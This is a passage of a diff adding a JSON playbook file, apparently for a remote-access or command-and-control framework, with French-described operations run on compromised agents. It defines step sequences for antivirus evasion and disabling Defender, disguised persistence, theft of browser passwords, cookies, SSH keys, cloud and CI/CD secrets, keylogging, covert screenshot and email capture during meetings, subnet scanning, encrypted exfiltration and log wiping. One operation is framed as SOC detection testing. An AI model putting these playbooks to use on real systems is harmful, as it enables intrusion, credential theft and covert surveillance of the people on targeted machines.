+          "module": "file",
+          "action": "search",
+          "params": {
+            "pattern": "*.pdf,*.docx,*.xlsx,*.jpg,*.db,*.sql,*.bak",
+            "paths": [
+              "~/Documents",
+              "~/Desktop",
+              "~/Server"
+            ],
+            "max": 1000
+          },
+          "delay": 5,
+          "timeout": 180,
+          "priority": "high",
+          "action_description": "Execute file:search"
+        },
+        {
+          "order": 9,
+          "module": "builtin",
+          "action": "shares",
+          "params": {},
+          "delay": 3,
+          "timeout": 60,
+          "priority": "normal",
+          "action_description": "Execute builtin:shares"
+        },
+        {
+          "order": 10,
+          "module": "port_scan",
+          "action": "subnet",
+          "params": {
+            "cidr": "192.168.1.0/24",
+            "ports": [
+              445,
+              3389,
+              22
+            ],
+            "timeout": 1
+          },
+          "delay": 5,
+          "timeout": 90,
+          "priority": "normal",
+          "action_description": "Execute port_scan:subnet"
+        },
+        {
+          "order": 11,
+          "module": "screen_stream",
+          "action": "frame",
+          "params": {
+            "quality": 90
+          },
+          "delay": 2,
+          "timeout": 15,
+          "priority": "high",
+          "action_description": "Execute screen_stream:frame"
+        },
+        {
+          "order": 12,
+          "module": "builtin",
+          "action": "simulate_ransom",
+          "params": {
+            "marker": ".KRAKEN_TEST",
+            "paths": [
+              "~/Desktop/RANSOM_TEST"
+            ],
+            "dry_run": true,
+            "create_note": true
+          },
+          "delay": 5,
+          "timeout": 60,
+          "priority": "critical",
+          "action_description": "Execute builtin:simulate_ransom"
+        },
+        {
+          "order": 13,
+          "module": "screenshot",
+          "action": "capture",
+          "params": {
+            "count": 5,
+            "interval": 5
+          },
+          "delay": 2,
+          "timeout": 60,
+          "priority": "high",
+          "action_description": "Execute screenshot:capture"
+        },
+        {
+          "order": 14,
+          "module": "file",
+          "action": "exfil",
+          "params": {
+            "compress": true,
+            "encrypt": true,
+            "chunk_size": 512000
+          },
+          "delay": 10,
+          "timeout": 300,
+          "priority": "critical",
+          "action_description": "Execute file:exfil"
+        },
+        {
+          "order": 15,
+          "module": "builtin",
+          "action": "clear_logs",
+          "params": {
+            "logs": [
+              "Security",
+              "System",
+              "Application"
+            ]
+          },
+          "delay": 5,
+          "timeout": 30,
+          "priority": "critical",
+          "action_description": "Execute builtin:clear_logs"
+        },
+        {
+          "order": 16,
+          "module": "builtin",
+          "action": "wipe_traces",
+          "params": {
+            "temp": true,
+            "prefetch": true
+          },
+          "delay": 3,
+          "timeout": 20,
+          "priority": "high",
+          "action_description": "Execute builtin:wipe_traces"
+        }
+      ]
+    },
+    {
+      "id": "op_iceberg",
+      "name": "OP ICEBERG — Supply Chain / DevOps",
+      "description": "Attaque d'un poste développeur pour compromettre la chaîne CI/CD. Vol de tokens GitHub/GitLab, secrets AWS/Azure/GCP, clés SSH de déploiement, fichiers .env de production. Accès potentiel à tous les environnements de production.",
+      "icon": "🧊",
+      "category": "credentials",
+      "trigger": "manual",
+      "agent_group": [
+        "all"
+      ],
+      "phases": [
+        {
+          "label": "Phase 1 — Dev Profiling",
+          "steps": [
+            1,
+            2,
+            3,
+            4
+          ]
+        },
+        {
+          "label": "Phase 2 — Secret Extraction",
+          "steps": [
+            5,
+            6,
+            7,
+            8,
+            9,
+            10
+          ]
+        },
+        {
+          "label": "Phase 3 — Code & Pipeline",
+          "steps": [
+            11,
+            12,
+            13
+          ]
+        },
+        {
+          "label": "Phase 4 — Cloud Access",
+          "steps": [
+            14,
+            15,
+            16
+          ]
+        }
+      ],
+      "steps": [
+        {
+          "order": 1,
+          "module": "anti_analysis",
+          "action": "check",
+          "params": {},
+          "delay": 0,
+          "timeout": 15,
+          "priority": "critical",
+          "action_description": "Execute anti_analysis:check"
+        },
+        {
+          "order": 2,
+          "module": "info",
+          "action": "run",
+          "params": {},
+          "delay": 2,
+          "timeout": 30,
+          "priority": "high",
+          "action_description": "Execute info:run"
+        },
+        {
+          "order": 3,
+          "module": "builtin",
+          "action": "installed",
+          "params": {},
+          "delay": 2,
+          "timeout": 30,
+          "priority": "normal",
+          "action_description": "Execute builtin:installed"
+        },
+        {
+          "order": 4,
+          "module": "builtin",
+          "action": "processes",
+          "params": {},
+          "delay": 2,
+          "timeout": 30,
+          "priority": "normal",
+          "action_description": "Execute builtin:processes"
+        },
+        {
+          "order": 5,
+          "module": "builtin",
+          "action": "env_secrets",
+          "params": {
+            "patterns": [
+              "TOKEN",
+              "SECRET",
+              "API_KEY",
+              "AWS",
+              "AZURE",
+              "GCP",
+              "GITHUB",
+              "GITLAB",
+              "DOCKER",
+              "NPM",
+              "PYPI",
+              "SLACK"
+            ]
+          },
+          "delay": 3,
+          "timeout": 30,
+          "priority": "critical",
+          "action_description": "Execute builtin:env_secrets"
+        },
+        {
+          "order": 6,
+          "module": "builtin",
+          "action": "ssh_keys",
+          "params": {},
+          "delay": 2,
+          "timeout": 20,
+          "priority": "critical",
+          "action_description": "Execute builtin:ssh_keys"
+        },
+        {
+          "order": 7,
+          "module": "file",
+          "action": "search",
+          "params": {
+            "pattern": ".env,.env.local,.env.prod,.env.staging,*.pem,*.p12,*.pfx,id_rsa,id_ed25519,*.key,credentials.json",
+            "max": 200,
+            "recursive": true
+          },
+          "delay": 5,
+          "timeout": 180,
+          "priority": "critical",
+          "action_description": "Execute file:search"
+        },
+        {
+          "order": 8,
+          "module": "file",
+          "action": "search",
+          "params": {
+            "pattern": ".aws/credentials,.azure/*,.kube/config,*.tfvars,terraform.tfstate*",
+            "max": 50
+          },
+          "delay": 3,
+          "timeout": 60,
+          "priority": "critical",
+          "action_description": "Execute file:search"
+        },
+        {
+          "order": 9,
+          "module": "builtin",
+          "action": "shell_history",
+          "params": {},
+          "delay": 2,
+          "timeout": 20,
+          "priority": "high",
+          "action_description": "Execute builtin:shell_history"
+        },
+        {
+          "order": 10,
+          "module": "browser",
+          "action": "passwords",
+          "params": {
+            "filter": [
+              "github",
+              "gitlab",
+              "aws",
+              "azure",
+              "gcp",
+              "docker",
+              "npm",
+              "heroku"
+            ]
+          },
+          "delay": 3,
+          "timeout": 90,
+          "priority": "critical",
+          "action_description": "Execute browser:passwords"
+        },
+        {
+          "order": 11,
+          "module": "file",
+          "action": "search",
+          "params": {
+            "pattern": "*.yml,*.yaml,Jenkinsfile,Dockerfile,.github/workflows/*.yml,*.ci.yml",
+            "max": 100
+          },
+          "delay": 3,
+          "timeout": 90,
+          "priority": "high",
+          "action_description": "Execute file:search"
+        },
+        {
+          "order": 12,
+          "module": "file",
+          "action": "search",
+          "params": {
+            "pattern": "package.json,requirements.txt,go.mod,Cargo.toml,*.csproj",
+            "max": 50
+          },
+          "delay": 2,
+          "timeout": 60,
+          "priority": "normal",
+          "action_description": "Execute file:search"
+        },
+        {
+          "order": 13,
+          "module": "builtin",
+          "action": "netinfo",
+          "params": {},
+          "delay": 2,
+          "timeout": 30,
+          "priority": "low",
+          "action_description": "Execute builtin:netinfo"
+        },
+        {
+          "order": 14,
+          "module": "file",
+          "action": "search",
+          "params": {
+            "pattern": "*.py,*.js,*.ts,*.go,*.java",
+            "paths": [
+              "~/code",
+              "~/projects",
+              "~/repos",
+              "~/workspace"
+            ],
+            "max": 300
+          },
+          "delay": 5,
+          "timeout": 180,
+          "priority": "normal",
+          "action_description": "Execute file:search"
+        },
+        {
+          "order": 15,
+          "module": "file",
+          "action": "exfil",
+          "params": {
+            "compress": true,
+            "encrypt": true,
+            "chunk_size": 512000
+          },
+          "delay": 10,
+          "timeout": 600,
+          "priority": "critical",
+          "action_description": "Execute file:exfil"
+        },
+        {
+          "order": 16,
+          "module": "builtin",
+          "action": "clear_history",
+          "params": {},
+          "delay": 3,
+          "timeout": 15,
+          "priority": "high",
+          "action_description": "Execute builtin:clear_history"
+        }
+      ]
+    },
+    {
+      "id": "op_blindspot",
+      "name": "OP BLINDSPOT — Analyse Angles Morts SOC",
+      "description": "Teste méthodiquement les capacités de détection du SOC. Chaque technique est exécutée avec un délai pour mesurer le temps de réaction : anti-AV, persistence multi-vecteurs, mouvement latéral, exfil HTTPS, effacement logs.",
+      "icon": "🕳",
+      "category": "simulation",
+      "trigger": "manual",
+      "agent_group": [
+        "all"
+      ],
+      "phases": [
+        {
+          "label": "Test 1 — AV/EDR Evasion",
+          "steps": [
+            1,
+            2,
+            3
+          ]
+        },
+        {
+          "label": "Test 2 — Persistence",
+          "steps": [
+            4,
+            5,
+            6
+          ]
+        },
+        {
+          "label": "Test 3 — Credential Access",
+          "steps": [
+            7,
+            8,
+            9
+          ]
+        },
+        {
+          "label": "Test 4 — Lateral Movement",
+          "steps": [
+            10,
+            11,
+            12
+          ]
+        },
+        {
+          "label": "Test 5 — Exfiltration",
+          "steps": [
+            13,
+            14
+          ]
+        },
+        {
+          "label": "Test 6 — Log Tampering",
+          "steps": [
+            15,
+            16
+          ]
+        }
+      ],
+      "steps": [
+        {
+          "order": 1,
+          "module": "anti_analysis",
+          "action": "check",
+          "params": {},
+          "delay": 0,
+          "timeout": 15,
+          "priority": "critical",
+          "action_description": "Execute anti_analysis:check"
+        },
+        {
+          "order": 2,
+          "module": "anti_analysis",
+          "action": "evade",
+          "params": {},
+          "delay": 30,
+          "timeout": 20,
+          "priority": "critical",
+          "action_description": "Execute anti_analysis:evade"
+        },
+        {
+          "order": 3,
+          "module": "builtin",
+          "action": "disable_defender",
+          "params": {},
+          "delay": 60,
+          "timeout": 30,
+          "priority": "critical",
+          "action_description": "Execute builtin:disable_defender"
+        },
+        {
+          "order": 4,
+          "module": "builtin",
+          "action": "persist",
+          "params": {
+            "method": "registry"
+          },
+          "delay": 60,
+          "timeout": 30,
+          "priority": "critical",
+          "action_description": "Execute builtin:persist"
+        },
+        {
+          "order": 5,
+          "module": "builtin",
+          "action": "persist",
+          "params": {
+            "method": "scheduled_task",
+            "name": "SvcHostMonitor"
+          },
+          "delay": 30,
+          "timeout": 30,
+          "priority": "critical",
+          "action_description": "Execute builtin:persist"
+        },
+        {
+          "order": 6,
+          "module": "builtin",
+          "action": "startup",
+          "params": {},
+          "delay": 60,
+          "timeout": 20,
+          "priority": "high",
+          "action_description": "Execute builtin:startup"
+        },
+        {
+          "order": 7,
+          "module": "browser",
+          "action": "passwords",
+          "params": {
+            "browsers": [
+              "chrome",
+              "firefox"
+            ]
+          },
+          "delay": 120,
+          "timeout": 90,
+          "priority": "critical",
+          "action_description": "Execute browser:passwords"
+        },
+        {
+          "order": 8,
+          "module": "builtin",
+          "action": "credential_manager",
+          "params": {},
+          "delay": 30,
+          "timeout": 30,
+          "priority": "critical",
+          "action_description": "Execute builtin:credential_manager"
+        },
+        {
+          "order": 9,
+          "module": "keylog",
+          "action": "start",
+          "params": {
+            "duration": 60
+          },
+          "delay": 120,
+          "timeout": 90,
+          "priority": "high",
+          "action_description": "Execute keylog:start"
+        },
+        {
+          "order": 10,
+          "module": "builtin",
+          "action": "arp",
+          "params": {},
+          "delay": 120,
+          "timeout": 20,
+          "priority": "normal",
+          "action_description": "Execute builtin:arp"
+        },
+        {
+          "order": 11,
+          "module": "port_scan",
+          "action": "subnet",
+          "params": {
+            "cidr": "192.168.1.0/24",
+            "ports": [
+              445,
+              3389,
+              22,
+              80
+            ],
+            "timeout": 1
+          },
+          "delay": 60,
+          "timeout": 90,
+          "priority": "normal",
+          "action_description": "Execute port_scan:subnet"
+        },
+        {
+          "order": 12,
+          "module": "builtin",
+          "action": "sessions",
+          "params": {},
+          "delay": 60,
+          "timeout": 30,
+          "priority": "high",
+          "action_description": "Execute builtin:sessions"
+        },
+        {
+          "order": 13,
+          "module": "file",
+          "action": "search",
+          "params": {
+            "pattern": "*.docx,*.xlsx,*.pdf",
+            "max": 20
+          },
+          "delay": 120,
+          "timeout": 60,
+          "priority": "high",
+          "action_description": "Execute file:search"
+        },
+        {
+          "order": 14,
+          "module": "file",
+          "action": "exfil",
+          "params": {
+            "compress": true,
+            "encrypt": true,
+            "chunk_size": 128000
+          },
+          "delay": 60,
+          "timeout": 120,
+          "priority": "critical",
+          "action_description": "Execute file:exfil"
+        },
+        {
+          "order": 15,
+          "module": "builtin",
+          "action": "clear_logs",
+          "params": {
+            "logs": [
+              "Security",
+              "System",
+              "PowerShell",
+              "Application"
+            ]
+          },
+          "delay": 120,
+          "timeout": 30,
+          "priority": "critical",
+          "action_description": "Execute builtin:clear_logs"
+        },
+        {
+          "order": 16,
+          "module": "builtin",
+          "action": "wipe_traces",
+          "params": {
+            "temp": true,
+            "prefetch": true,
+            "thumbcache": true
+          },
+          "delay": 30,
+          "timeout": 30,
+          "priority": "high",
+          "action_description": "Execute builtin:wipe_traces"
+        }
+      ]
+    },
+    {
+      "id": "op_viper",
+      "name": "OP VIPER — Triage Initial 5min",
+      "description": "Collecte maximale en 5 minutes top chrono. Dès qu'un agent se connecte : sysinfo complète, tous les credentials navigateur, WiFi, SSH keys, env secrets, screenshot, clipboard. Parfait pour une fenêtre d'accès courte.",
+      "icon": "⚡",
+      "category": "recon",
+      "trigger": "on_connect",
+      "agent_group": [
+        "all"
+      ],
+      "phases": [
+        {
+          "label": "Phase 1 — Fingerprint",
+          "steps": [
+            1,
+            2,
+            3
+          ]
+        },
+        {
+          "label": "Phase 2 — Quick Creds",
+          "steps": [
+            4,
+            5,
+            6,
+            7
+          ]
+        },
+        {
+          "label": "Phase 3 — Visual Intel",
+          "steps": [
+            8,
+            9
+          ]
+        }
+      ],
+      "steps": [
+        {
+          "order": 1,
+          "module": "anti_analysis",
+          "action": "check",
+          "params": {
+            "abort_on_detected": true
+          },
+          "delay": 0,
+          "timeout": 10,
+          "priority": "critical",
+          "action_description": "Execute anti_analysis:check"
+        },
+        {
+          "order": 2,
+          "module": "info",
+          "action": "run",
+          "params": {},
+          "delay": 1,
+          "timeout": 20,
+          "priority": "critical",
+          "action_description": "Execute info:run"
+        },
+        {
+          "order": 3,
+          "module": "builtin",
+          "action": "processes",
+          "params": {},
+          "delay": 1,
+          "timeout": 15,
+          "priority": "high",
+          "action_description": "Execute builtin:processes"
+        },
+        {
+          "order": 4,
+          "module": "browser",
+          "action": "steal",
+          "params": {
+            "browsers": [
+              "chrome",
+              "firefox",
+              "edge",
+              "brave"
+            ]
+          },
+          "delay": 2,
+          "timeout": 60,
+          "priority": "critical",
+          "action_description": "Execute browser:steal"
+        },
+        {
+          "order": 5,
+          "module": "wifi",
+          "action": "credentials",
+          "params": {},
+          "delay": 1,
+          "timeout": 15,
+          "priority": "high",
+          "action_description": "Execute wifi:credentials"
+        },
+        {
+          "order": 6,
+          "module": "builtin",
+          "action": "ssh_keys",
+          "params": {},
+          "delay": 1,
+          "timeout": 10,
+          "priority": "high",
+          "action_description": "Execute builtin:ssh_keys"
+        },
+        {
+          "order": 7,
+          "module": "builtin",
+          "action": "env_secrets",
+          "params": {
+            "patterns": [
+              "TOKEN",
+              "SECRET",
+              "API_KEY",
+              "PASSWORD",
+              "AWS",
+              "AZURE"
+            ]
+          },
+          "delay": 1,
+          "timeout": 10,
+          "priority": "high",
+          "action_description": "Execute builtin:env_secrets"
+        },
+        {
+          "order": 8,
+          "module": "screenshot",
+          "action": "capture",
+          "params": {
+            "count": 3,
+            "interval": 5
+          },
+          "delay": 2,
+          "timeout": 30,
+          "priority": "normal",
+          "action_description": "Execute screenshot:capture"
+        },
+        {
+          "order": 9,
+          "module": "builtin",
+          "action": "shell_history",
+          "params": {},
+          "delay": 1,
+          "timeout": 10,
+          "priority": "normal",
+          "action_description": "Execute builtin:shell_history"
+        }
+      ]
+    },
+    {
+      "id": "op_medusa",
+      "name": "OP MEDUSA — Credential Harvest Total",
+      "description": "Extraction exhaustive de tous les credentials disponibles : 5 navigateurs (passwords + cookies + autofill), WiFi, Credential Manager Windows, SSH keys, variables d'environnement, historique shell, fichiers .env et certificats. Keylogger 2min en fin.",
+      "icon": "🐍",
+      "category": "credentials",
+      "trigger": "manual",
+      "agent_group": [
+        "all"
+      ],
+      "phases": [
+        {
+          "label": "Phase 1 — Browser Sweep",
+          "steps": [
+            1,
+            2,
+            3,
+            4
+          ]
+        },
+        {
+          "label": "Phase 2 — OS Credentials",
+          "steps": [
+            5,
+            6,
+            7,
+            8
+          ]
+        },
+        {
+          "label": "Phase 3 — File Secrets",
+          "steps": [
+            9,
+            10,
+            11
+          ]
+        },
+        {
+          "label": "Phase 4 — Live Capture",
+          "steps": [
+            12,
+            13
+          ]
+        }
+      ],
+      "steps": [
+        {
+          "order": 1,
+          "module": "anti_analysis",
+          "action": "check",
+          "params": {
+            "abort_on_detected": true
+          },
+          "delay": 0,
+          "timeout": 10,
+          "priority": "critical",
+          "action_description": "Execute anti_analysis:check"
+        },
+        {
+          "order": 2,
+          "module": "browser",
+          "action": "steal",
+          "params": {
+            "browsers": [
+              "chrome",
+              "firefox",
+              "edge",
+              "brave",
+              "opera"
+            ]
+          },
+          "delay": 2,
+          "timeout": 90,
+          "priority": "critical",
+          "action_description": "Execute browser:steal"
+        },
+        {
+          "order": 3,
+          "module": "browser",
+          "action": "cookies",
+          "params": {
+            "browsers": [
+              "chrome",
+              "firefox",
+              "edge"
+            ]
+          },
+          "delay": 3,
+          "timeout": 60,
+          "priority": "critical",
+          "action_description": "Execute browser:cookies"
+        },
+        {
+          "order": 4,
+          "module": "browser",
+          "action": "history",
+          "params": {
+            "limit": 1000
+          },
+          "delay": 2,
+          "timeout": 60,
+          "priority": "normal",
+          "action_description": "Execute browser:history"
+        },
+        {
+          "order": 5,
+          "module": "wifi",
+          "action": "credentials",
+          "params": {},
+          "delay": 2,
+          "timeout": 20,
+          "priority": "high",
+          "action_description": "Execute wifi:credentials"
+        },
+        {
+          "order": 6,
+          "module": "builtin",
+          "action": "credential_manager",
+          "params": {},
+          "delay": 2,
+          "timeout": 20,
+          "priority": "critical",
+          "action_description": "Execute builtin:credential_manager"
+        },
+        {
+          "order": 7,
+          "module": "builtin",
+          "action": "ssh_keys",
+          "params": {},
+          "delay": 1,
+          "timeout": 10,
+          "priority": "high",
+          "action_description": "Execute builtin:ssh_keys"
+        },
+        {
+          "order": 8,
+          "module": "builtin",
+          "action": "shell_history",
+          "params": {},
+          "delay": 1,
+          "timeout": 10,
+          "priority": "high",
+          "action_description": "Execute builtin:shell_history"
+        },
+        {
+          "order": 9,
+          "module": "builtin",
+          "action": "env_secrets",
+          "params": {
+            "patterns": [
+              "TOKEN",
+              "SECRET",
+              "API_KEY",
+              "PASSWORD",
+              "AWS",
+              "AZURE",
+              "GCP",
+              "GITHUB",
+              "GITLAB",
+              "SLACK",
+              "STRIPE",
+              "TWILIO"
+            ]
+          },
+          "delay": 2,
+          "timeout": 15,
+          "priority": "critical",
+          "action_description": "Execute builtin:env_secrets"
+        },
+        {
+          "order": 10,
+          "module": "file",
+          "action": "tree",
+          "params": {
+            "path": "~",
+            "depth": 3
+          },
+          "delay": 2,
+          "timeout": 30,
+          "priority": "normal",
+          "action_description": "Execute file:tree"
+        },
+        {
+          "order": 11,
+          "module": "builtin",
+          "action": "recent_files",
+          "params": {
+            "limit": 100
+          },
+          "delay": 2,
+          "timeout": 20,
+          "priority": "normal",
+          "action_description": "Execute builtin:recent_files"
+        },
+        {
+          "order": 12,
+          "module": "keylog",
+          "action": "start",
+          "params": {},
+          "delay": 3,
+          "timeout": 10,
+          "priority": "high",
+          "action_description": "Execute keylog:start"
+        },
+        {
+          "order": 13,
+          "module": "screenshot",
+          "action": "capture",
+          "params": {
+            "count": 5,
+            "interval": 10
+          },
+          "delay": 5,
+          "timeout": 70,
+          "priority": "normal",
+          "action_description": "Execute screenshot:capture"
+        }
+      ]
+    },
+    {
+      "id": "op_ghost_recon",
+      "name": "OP GHOST RECON — Cartographie Réseau",
+      "description": "Reconnaissance complète et silencieuse. Cartographie exacte de l'OS, utilisateurs, groupes, services, réseau local, ARP, routes, partages, DNS, domaine AD. Aucune modification système. Aucune persistance.",
+      "icon": "🗺",
+      "category": "recon",
+      "trigger": "manual",
+      "agent_group": [
+        "all"
+      ],
+      "phases": [
+        {
+          "label": "Phase 1 — Host Profiling",
+          "steps": [
+            1,
+            2,
+            3,
+            4,
+            5,
+            6
+          ]
+        },
+        {
+          "label": "Phase 2 — Network Mapping",
+          "steps": [
+            7,
+            8,
+            9,
+            10,
+            11
+          ]
+        },
+        {
+          "label": "Phase 3 — AD Discovery",
+          "steps": [
+            12,
+            13,
+            14,
+            15
+          ]
+        },
+        {
+          "label": "Phase 4 — Visual Capture",
+          "steps": [
+            16,
+            17
+          ]
+        }
+      ],
+      "steps": [
+        {
+          "order": 1,
+          "module": "anti_analysis",
+          "action": "check",
+          "params": {},
+          "delay": 0,
+          "timeout": 10,
+          "priority": "critical",
+          "action_description": "Execute anti_analysis:check"
+        },
+        {
+          "order": 2,
+          "module": "info",
+          "action": "run",
+          "params": {},
+          "delay": 1,
+          "timeout": 30,
+          "priority": "high",
+          "action_description": "Execute info:run"
+        },
+        {
+          "order": 3,
+          "module": "builtin",
+          "action": "users",
+          "params": {},
+          "delay": 2,
+          "timeout": 15,
+          "priority": "normal",
+          "action_description": "Execute builtin:users"
+        },
+        {
+          "order": 4,
+          "module": "builtin",
+          "action": "groups",
+          "params": {},
+          "delay": 2,
+          "timeout": 15,
+          "priority": "normal",
+          "action_description": "Execute builtin:groups"
+        },
+        {
+          "order": 5,
+          "module": "builtin",
+          "action": "services",
+          "params": {},
+          "delay": 2,
+          "timeout": 20,
+          "priority": "normal",
+          "action_description": "Execute builtin:services"
+        },
+        {
+          "order": 6,
+          "module": "builtin",
+          "action": "startup",
+          "params": {},
+          "delay": 2,
+          "timeout": 15,
+          "priority": "normal",
+          "action_description": "Execute builtin:startup"
+        },
+        {
+          "order": 7,
+          "module": "builtin",
+          "action": "netinfo",
+          "params": {},
+          "delay": 2,
+          "timeout": 20,
+          "priority": "normal",
+          "action_description": "Execute builtin:netinfo"
+        },
+        {
+          "order": 8,
+          "module": "builtin",
+          "action": "netstat",
+          "params": {},
+          "delay": 2,
+          "timeout": 20,
+          "priority": "normal",
+          "action_description": "Execute builtin:netstat"
+        },
+        {
+          "order": 9,
+          "module": "builtin",
+          "action": "arp",
+          "params": {},
+          "delay": 2,
+          "timeout": 15,
+          "priority": "normal",
+          "action_description": "Execute builtin:arp"
+        },
+        {
+          "order": 10,
+          "module": "builtin",
+          "action": "routes",
+          "params": {},
+          "delay": 2,
+          "timeout": 15,
+          "priority": "normal",
+          "action_description": "Execute builtin:routes"
+        },
+        {
+          "order": 11,
+          "module": "builtin",
+          "action": "shares",
+          "params": {},
+          "delay": 2,
+          "timeout": 20,
+          "priority": "normal",
+          "action_description": "Execute builtin:shares"
+        },
+        {
+          "order": 12,
+          "module": "builtin",
+          "action": "domain_users",
+          "params": {},
+          "delay": 3,
+          "timeout": 20,
+          "priority": "high",
+          "action_description": "Execute builtin:domain_users"
+        },
+        {
+          "order": 13,
+          "module": "builtin",
+          "action": "domain_admins",
+          "params": {},
+          "delay": 2,
+          "timeout": 20,
+          "priority": "high",
+          "action_description": "Execute builtin:domain_admins"
+        },
+        {
+          "order": 14,
+          "module": "builtin",
+          "action": "domain_computers",
+          "params": {},
+          "delay": 2,
+          "timeout": 20,
+          "priority": "normal",
+          "action_description": "Execute builtin:domain_computers"
+        },
+        {
+          "order": 15,
+          "module": "builtin",
+          "action": "dns_enum",
+          "params": {
+            "domain": "corp.local"
+          },
+          "delay": 3,
+          "timeout": 30,
+          "priority": "normal",
+          "action_description": "Execute builtin:dns_enum"
+        },
+        {
+          "order": 16,
+          "module": "screenshot",
+          "action": "capture",
+          "params": {
+            "count": 2,
+            "interval": 5
+          },
+          "delay": 2,
+          "timeout": 20,
+          "priority": "normal",
+          "action_description": "Execute screenshot:capture"
+        },
+        {
+          "order": 17,
+          "module": "wifi",
+          "action": "scan",
+          "params": {},
+          "delay": 2,
+          "timeout": 20,
+          "priority": "low",
+          "action_description": "Execute wifi:scan"
+        }
+      ]
+    },
+    {
+      "id": "op_siren",
+      "name": "OP SIREN — Espionnage Réunions",
+      "description": "Surveillance ciblée d'une réunion ou session de travail. Screenshots toutes les 30s pendant 1h, keylogger complet, monitoring clipboard (copier-coller de credentials en réunion), capture des emails et messages. Idéal pour capturer des informations sensibles partagées pendant des appels.",
+      "icon": "🎙",
+      "category": "surveillance",
+      "trigger": "manual",
+      "agent_group": [
+        "all"
+      ],
+      "phases": [
+        {
+          "label": "Phase 1 — Setup Surveillance",
+          "steps": [
+            1,
+            2,
+            3
+          ]
+        },
+        {
+          "label": "Phase 2 — Capture Active",
+          "steps": [
+            4,
+            5,
+            6,
+            7
+          ]
+        },
+        {
+          "label": "Phase 3 — Data Collection",
+          "steps": [
+            8,
+            9,
+            10
+          ]
+        }
+      ],
+      "steps": [
+        {
+          "order": 1,
+          "module": "anti_analysis",
+          "action": "check",
+          "params": {
+            "abort_on_detected": true
+          },
+          "delay": 0,
+          "timeout": 10,
+          "priority": "critical",
+          "action_description": "Execute anti_analysis:check"
+        },
+        {
+          "order": 2,
+          "module": "info",
+          "action": "processes",
+          "params": {},
+          "delay": 2,
+          "timeout": 15,
+          "priority": "normal",
+          "action_description": "Execute info:processes"
+        },
+        {
+          "order": 3,
+          "module": "builtin",
+          "action": "installed",
+          "params": {},
+          "delay": 2,
+          "timeout": 20,
+          "priority": "normal",
+          "action_description": "Execute builtin:installed"
+        },
+        {
+          "order": 4,
+          "module": "keylog",
+          "action": "start",
+          "params": {},
+          "delay": 3,
+          "timeout": 10,
+          "priority": "critical",
+          "action_description": "Execute keylog:start"
+        },
+        {
+          "order": 5,
+          "module": "screenshot",
+          "action": "stream_start",
+          "params": {
+            "interval": 30.0,
+            "max_frames": 120,
+            "quality": 80
+          },
+          "delay": 3,
+          "timeout": 10,
+          "priority": "high",
+          "action_description": "Execute screenshot:stream_start"
+        },
+        {
+          "order": 6,
+          "module": "screen_stream",
+          "action": "frame",
+          "params": {
+            "quality": 85
+          },
+          "delay": 5,
+          "timeout": 15,
+          "priority": "high",
+          "action_description": "Execute screen_stream:frame"
+        },
+        {
+          "order": 7,
+          "module": "builtin",
+          "action": "netstat",
+          "params": {},
+          "delay": 5,
+          "timeout": 20,
+          "priority": "low",
+          "action_description": "Execute builtin:netstat"
+        },
+        {
+          "order": 8,
+          "module": "builtin",
+          "action": "outlook_emails",
+          "params": {
+            "limit": 50,
+            "folders": [
+              "Inbox",
+              "Sent"
+            ]
+          },
+          "delay": 10,
+          "timeout": 60,
+          "priority": "normal",
+          "action_description": "Execute builtin:outlook_emails"
+        },
+        {
+          "order": 9,
+          "module": "builtin",
+          "action": "telegram_data",
+          "params": {},
+          "delay": 5,
+          "timeout": 20,
+          "priority": "normal",
+          "action_description": "Execute builtin:telegram_data"
+        },
+        {
+          "order": 10,
+          "module": "browser",
+          "action": "history",
+          "params": {
+            "limit": 100
+          },
+          "delay": 5,
+          "timeout": 30,
+          "priority": "low",
+          "action_description": "Execute browser:history"
+        }
+      ]
+    },
+    {
+      "id": "op_tsunami",
+      "name": "OP TSUNAMI — Déploiement Masse",
+      "description": "Collecte simultanée sur tous les agents actifs. Reconnaissance légère + credentials navigateur + SSH keys + env secrets. Conçu pour une extraction rapide sur un maximum de machines en parallèle. Trigger automatique sur nouveau groupe.",
+      "icon": "🌊",
+      "category": "recon",
+      "trigger": "on_connect",
+      "agent_group": [
+        "all"
+      ],
+      "phases": [
+        {
+          "label": "Phase 1 — Fast Fingerprint",
+          "steps": [
+            1,
+            2
+          ]
+        },
+        {
+          "label": "Phase 2 — Credential Grab",
+          "steps": [
+            3,
+            4,
+            5
+          ]
+        },
+        {
+          "label": "Phase 3 — Quick Exfil",
+          "steps": [
+            6,
+            7
+          ]
+        }
+      ],
+      "steps": [
+        {
+          "order": 1,
+          "module": "anti_analysis",
+          "action": "check",
+          "params": {
+            "abort_on_detected": true
+          },
+          "delay": 0,
+          "timeout": 8,
+          "priority": "critical",
+          "action_description": "Execute anti_analysis:check"
+        },
+        {
+          "order": 2,
+          "module": "info",
+          "action": "run",
+          "params": {},
+          "delay": 1,
+          "timeout": 20,
+          "priority": "critical",
+          "action_description": "Execute info:run"
+        },
+        {
+          "order": 3,
+          "module": "browser",
+          "action": "steal",
+          "params": {
+            "browsers": [
+              "chrome",
+              "firefox",
+              "edge"
+            ]
+          },
+          "delay": 2,
+          "timeout": 60,
+          "priority": "critical",
+          "action_description": "Execute browser:steal"
+        },
+        {
+          "order": 4,
+          "module": "wifi",
+          "action": "credentials",
+          "params": {},
+          "delay": 1,
+          "timeout": 15,
+          "priority": "high",
+          "action_description": "Execute wifi:credentials"
+        },
+        {
+          "order": 5,
+          "module": "builtin",
+          "action": "env_secrets",
+          "params": {
+            "patterns": [
+              "TOKEN",
+              "SECRET",
+              "API_KEY",
+              "AWS",
+              "AZURE"
+            ]
+          },
+          "delay": 1,
+          "timeout": 10,
+          "priority": "high",
+          "action_description": "Execute builtin:env_secrets"
+        },
+        {
+          "order": 6,
+          "module": "screenshot",
+          "action": "capture",
+          "params": {
+            "count": 1,
+            "interval": 1
+          },
+          "delay": 2,
+          "timeout": 15,
+          "priority": "normal",
+          "action_description": "Execute screenshot:capture"
+        },
+        {
+          "order": 7,
+          "module": "builtin",
+          "action": "ssh_keys",
+          "params": {},
+          "delay": 1,
+          "timeout": 10,
+          "priority": "normal",
+          "action_description": "Execute builtin:ssh_keys"
+        }
+      ]
+    },
+    {
+      "id": "op_bloodhound",
+      "name": "OP BLOODHOUND — AD Full Map",
+      "description": "Cartographie complète de l'Active Directory : utilisateurs, groupes, ordinateurs, Domain Admins, trusts, sessions actives, partages réseau, ports critiques. Identification des DC et serveurs prioritaires pour l'escalade de privilèges.",
+      "icon": "🐕",
+      "category": "lateral",
+      "trigger": "manual",
+      "agent_group": [
+        "all"
+      ],
+      "phases": [
+        {
+          "label": "Phase 1 — AD Enumeration",
+          "steps": [
+            1,
+            2,
+            3,
